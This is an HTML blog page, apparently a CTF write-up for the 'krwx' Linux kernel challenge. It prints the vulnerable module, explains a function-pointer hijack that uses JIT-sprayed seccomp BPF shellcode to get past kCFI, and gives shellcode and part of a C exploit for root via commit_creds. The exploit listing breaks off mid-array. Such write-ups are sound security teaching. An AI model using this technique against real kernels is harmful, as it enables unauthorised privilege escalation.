<!DOCTYPE html>
<html lang="en">

    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>krwx &ndash; kqx</title>
<meta name="description" content="">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="UTF-8"/>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />


<link rel="stylesheet" href="http://localhost:1313/css/palettes/base16-dark.css">
<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
<link rel="stylesheet" href="http://localhost:1313/css/custom.css">












<meta property="og:title" content="krwx &ndash; kqx" />
<meta property="og:url" content="http://localhost:1313/post/krwx/" />

  
    <meta property="og:description" content=""/> 
  

<meta property="og:locale" content="en-us" />
<meta property="og:image" content="" /></head>

    <body>
        <div class="page">

            <header class="page__header"><nav class="page__nav main-nav">
    <ul>
      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">kqx</a></h1></li>
    
    
    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/about/" title="">About</a></li>
    
    <li class="main-nav__item"><a class="nav-main-item active" href="http://localhost:1313/post/" title="Posts">Posts</a></li>
    
    </ul>
</nav>

</header>
            
            <section class="page__body">
    <header class="content__header">
        <h1>krwx</h1>
    </header>
    <div class="content__body">
        <h2 id="description">Description</h2>
<blockquote>
<p><em>Too easy?</em></p>
</blockquote>
<h2 id="source-code">Source code</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/miscdevice.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/mutex.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_AUTHOR</span>(<span style="color:#e6db74">&#34;prosti&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_DESCRIPTION</span>(<span style="color:#e6db74">&#34;ToH CTF 2025&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DEV_NAME &#34;pwn&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_WRITE 0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_READ  0x1338
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_EXEC  0x1339
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span> pwn_function)(<span style="color:#66d9ef">void</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> exec_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeefcafebabe</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#a6e22e">DEFINE_MUTEX</span>(mutex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn_nop</span>(<span style="color:#66d9ef">void</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations pwn_ops <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .owner <span style="color:#f92672">=</span> THIS_MODULE,
</span></span><span style="display:flex;"><span>    .open <span style="color:#f92672">=</span> pwn_open,
</span></span><span style="display:flex;"><span>    .release <span style="color:#f92672">=</span> pwn_release,
</span></span><span style="display:flex;"><span>    .unlocked_ioctl <span style="color:#f92672">=</span> pwn_ioctl
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> miscdevice pwn_dev <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .minor <span style="color:#f92672">=</span> MISC_DYNAMIC_MINOR,
</span></span><span style="display:flex;"><span>    .name <span style="color:#f92672">=</span> DEV_NAME,
</span></span><span style="display:flex;"><span>    .fops <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>pwn_ops
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn_nop</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_lock</span>(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(cmd){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> CMD_PWN_WRITE:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>((result <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>pwn_function, (<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))arg, <span style="color:#66d9ef">sizeof</span>(pwn_function))))
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;pwn: copy_from_user failed&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> CMD_PWN_READ:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>((result <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))arg, <span style="color:#f92672">&amp;</span>pwn_function, <span style="color:#66d9ef">sizeof</span>(pwn_function))))
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;pwn: copy_to_user failed&#34;</span>);
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> CMD_PWN_EXEC:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(exec_called <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xdeadbeefcafebabe</span>){
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> pwn_ioctl_end;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            pwn_ops.unlocked_ioctl <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>            pwn_dev.fops <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>            exec_called <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">pwn_function</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwn_ioctl_end:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_unlock</span>(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwn_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">pwn_init</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;pwn: initializing device&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mutex_init</span>(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#a6e22e">misc_register</span>(<span style="color:#f92672">&amp;</span>pwn_dev);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printk</span>(KERN_WARNING <span style="color:#e6db74">&#34;pwn: misc_register failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pwn_function <span style="color:#f92672">=</span> pwn_nop;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">pwn_exit</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;pwn: unregistering device&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">misc_deregister</span>(<span style="color:#f92672">&amp;</span>pwn_dev);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(pwn_init);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(pwn_exit);
</span></span></code></pre></div><h2 id="spotting-the-vulnerability">Spotting the vulnerability</h2>
<p>The vulnerability is very easy to spot. By interacting with the module you can read, write and call, just once, a pointer to a function (function prototype <code>void (*) (void)</code>).</p>
<p>Keep in mind that <code>CONFIG_BPF_JIT</code> is defined, that <code>unprivileged_bpf_disabled=1</code> and that <code>cfi=norand</code>.</p>
<h2 id="module-leak">Module leak</h2>
<p>The challenge initializes the function pointer to <code>pwn_nop</code>. The first step is to read the pointer using <code>CMD_PWN_READ</code>. This leak is independant from <code>kbase</code> but it is useful for the next steps.</p>
<h2 id="function-pointer-overwrite">Function pointer overwrite</h2>
<p>Now we can overwrite the function pointer with an arbitrary value. But where should it point to?</p>
<p>kCFI is on. This means that we can just call functions that have the same parameters and return value as <code>pwn_nop</code> but there are a few problems. We don&rsquo;t know where the kernel&rsquo;s <code>.text</code> area is located and even if we knew, there are not useful functions to call.</p>
<p>It would be very useful if we could just compile arbirary shellcode in kernel space&hellip;</p>
<h2 id="loading-the-seccomp-filter">Loading the seccomp filter</h2>
<p>So pretty much, we cannot load normal eBPF programs (because of <code>unprivileged_bpf_disabled=1</code>) so we need to find an alternative.</p>
<p>Seccomp filters are technically BPF programs that are generally used to block or allow certain syscalls to userland processes. The program is written in BPF bytecode, loaded through the prctl system call,  verified in kernel space and then it is interpreted or <a href="https://elixir.bootlin.com/linux/v6.15.4/source/arch/x86/net/bpf_jit_comp.c#L3552">JIT compiled</a>. Seccomp filters can only use 32 bit registers.</p>
<p>Fortunately for us, the jitted filters are located in the same area as kernel modules (and with <code>gdb</code> you can easly see that the filter is almost at a constant offset from <code>pwn_nop</code>) meaning that we don&rsquo;t need any other leak.</p>
<h2 id="shellcode">Shellcode</h2>
<p>By using the &ldquo;load 32 bit immediate&rdquo; instruction (<code>BPF_STMT(BPF_LD | BPF_IMM, imm32)</code>) we can load arbitrarily 4 bytes into a register. This will be jitted to  <code>mov eax, imm32</code>.</p>
<p>At this point we can jump one byte after the start of a <code>mov eax, imm32</code> instruction of seccomp filter to execute arbitrary shellcode. You also have to fake the function signature (it has to be 0xf bytes before the function&rsquo;s start).</p>
<p>The module does not allow you to call the arbitrary function again so you have to escalate privileges in one go.</p>
<p>This is the shellcode that I came up with (100% not optimized but it works). There are smarter paths but this should be the pretty straight forward.</p>
<pre tabindex="0"><code>pop rbx
pop rbx
jmp $+3

pop rbx
pop rbx
jmp $+3

pop rdi
pop rdi
jmp $+3

pop rdi
pop rdi
jmp $+3

pop rdi
nop
jmp $+3

sub ebx, edx
jmp $+3

push rbx
nop
jmp $+3

xchg rsp, rax
jmp $+3

add al, 0xc
jmp $+3

xor ecx, ecx
jmp $+3

not ecx
jmp $+3

xchg rsp, rax
jmp $+3

push rcx
nop
jmp $+3

xchg rsp, rax
jmp $+3

sub al, 0x4
jmp $+3

xchg rsp, rax
jmp $+3

xor ecx, ecx
jmp $+3

xor eax, eax
jmp $+3

mov cl, 0x8
jmp $+3

add al, 0x01
jmp $+3

shl eax, cl 
jmp $+3

add al, 0x97
jmp $+3

shl eax, cl 
jmp $+3

add al, 0xb8
jmp $+3

shl eax, cl 
jmp $+3

add al, 0x50
jmp $+3

add ebx, eax
jmp $+3

push rax
push rax
jmp $+3

push rax
push rbx
jmp $+3

xchg rsp, rax
jmp $+3

add al, 0xc
jmp $+3

xor ecx, ecx
jmp $+3

not ecx
jmp $+3

xchg rsp, rax
jmp $+3

push rcx
nop
jmp $+3

xchg rsp, rax
jmp $+3

sub al, 0x4
jmp $+3

xchg rsp, rax
jmp $+3

pop rdi
pop rax
jmp $+3

pop rax
pop rax
jmp $+3

pop rax
nop
jmp $+3

call rax
jmp $+3

pop rax
... ; 29 times
pop rax
ret
</code></pre><p>Keep in mind that you control the value of <code>rdx</code> at call time and that you can find kbase leaks on the stack.</p>
<h2 id="flag">Flag</h2>
<p><code>toh{JIT_spr4y1ng_1s_my_p4s510n_0f01c80f0110}</code></p>
<h2 id="full-exploit">Full exploit</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Author: prosti (@.prosti. on Discord)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;helpers.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/filter.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/seccomp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DEV &#34;/dev/pwn&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_WRITE 0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_READ  0x1338
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CMD_PWN_EXEC  0x1339
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BPF_OFFSET           0x00200a40
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define VOID_STATIC_HASH     0xa540670c </span><span style="color:#75715e">// to get this just disable kcfi randomization momentarely (cfi=norand) 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define LANDING_ZONE_SIZE    0x100
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define x64_SYS_IOCTL_2_COMMIT_CREDS    0x002aab13 </span><span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define COMMIT_CREDS_2_INIT_CRED        0x0197b850 </span><span style="color:#75715e">// directly hardcoded in the shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint8_t</span> shellcode[][<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {   
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x2C</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xB1</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x2C</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
